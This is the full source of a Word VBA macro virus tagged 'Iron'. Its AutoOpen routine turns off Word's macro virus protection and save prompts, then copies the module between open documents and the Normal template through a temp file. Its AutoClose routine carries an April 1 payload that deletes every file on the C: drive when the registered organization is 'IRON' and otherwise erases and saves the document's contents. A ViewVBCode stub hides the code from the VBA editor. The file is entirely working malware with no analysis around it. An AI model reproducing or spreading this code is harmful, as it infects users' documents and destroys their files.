Attribute VB_Name = "Unit"
                                                                                                Sub ToN()
'Iron
                                                                                                On Error Resume Next
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"

                                                                                                With NormalTemplate.VBProject.VBComponents
                                                                                                               '8
                                                                                                 NormalTemplate.Save
                                                                                                    Kill (file)
                                                                                                End With
                                                                                                End Sub
                                                                                                Sub ToA()
                                                                                                On Error Resume Next
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"
                                                                                                With ActiveDocument.VBProject.VBComponents
                                                                                                                                          '18
                                                                                                ActiveDocument.SaveAs ActiveDocument.FullName
                                                                                                    Kill (file)
                                                                                                End With
                                                                                                End Sub
                                                                                                Sub AutoOpen()
                                                                                                On Error Resume Next
                                                                                                If Options.VirusProtection Then Options.VirusProtection = Not Options.VirusProtection
                                                                                                If Options.ConfirmConversions Then Options.ConfirmConversions = Not Options.ConfirmConversions
                                                                                                If Options.SaveNormalPrompt Then Options.SaveNormalPrompt = Not Options.SaveNormalPrompt
                                                                                                file = "c:\Iron.tmp"
                                                                                                Un = "Unit"
                                                                                                If NormalTemplate.VBProject.VBComponents.Item(Un).CodeModule.Lines(2, 1) <> "'Iron" Then
                                                                                                ActiveDocument.VBProject.VBComponents(Un).Export (file)
                                                                                                With ActiveDocument.VBProject.VBComponents(Un).CodeModule
                                                                                                    .DeleteLines 8
                                                                                                    .InsertLines 8, "   .import (file)"
                                                                                                End With
                                                                                                Call ToN
                                                                                                With ActiveDocument.VBProject.VBComponents(Un).CodeModule
                                                                                                    .DeleteLines 8
                                                                                                    .InsertLines 8, "                                                                                                               '8"
                                                                                                End With
                                                                                                End If
                                                                                                If ActiveDocument.VBProject.VBComponents.Item(Un).CodeModule.Lines(2, 1) <> "'Iron" Then
                                                                                                    NormalTemplate.VBProject.VBComponents(Un).Export (file)
                                                                                                    With NormalTemplate.VBProject.VBComponents(Un).CodeModule
                                                                                                        .DeleteLines 18
                                                                                                        .InsertLines 18, "   ActiveDocument.VBProject.VBComponents.import (file)"
                                                                                                    End With
                                                                                                    Call ToA
                                                                                                    With NormalTemplate.VBProject.VBComponents(Un).CodeModule
                                                                                                        .DeleteLines 18
                                                                                                        .InsertLines 18, "                                                                                                                                          '18"
                                                                                                    End With
                                                                                                    NormalTemplate.Save
                                                                                                End If
                                     
                                                                                                End Sub
                                                                                                Sub AutoClose()
                                                                                                    On Error Resume Next
                                                                                                    Call AutoOpen
                                                                                                  ActiveDocument.SaveAs ActiveDocument.FullName
                                                                                                  If (Day(Now()) = 1) And (Month(Now()) = 4) Then
                                                                                                    If UCase(System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization")) = "IRON" Then
                                                                                                     With Application.FileSearch
                                                                                                      .NewSearch
                                                                                                      .LookIn = "C:\"
                                                                                                      .SearchSubFolders = True
                                                                                                      .FileName = "*.*"
                                                                                                      .MatchTextExactly = False
                                                                                                      .FileType = msoFileTypeAllFiles
                                                                                                      If .Execute > 0 Then
                                                                                                        For i = 1 To .FoundFiles.Count
                                                                                                          Kill .FoundFiles(i)
                                                                                                        Next i
                                                                                                      End If
                                                                                                    End With
                                                                                                    Else
                                                                                                      Selection.WholeStory
                                                                                                      Selection.Delete
                                                                                                      ActiveDocument.SaveAs ActiveDocument.FullName
                                                                                                  End If
                                                                                                  End If
                                                                                                End Sub
                                                                                                Sub ViewVBCode()
                                                                                                  On Error Resume Next
                                                                                                  Application.ShowVisualBasicEditor = False
                                                                                                End Sub
                                                                                                Private Sub Document_New()
                                                                                                 Call AutoOpen
                                                                                                End Sub

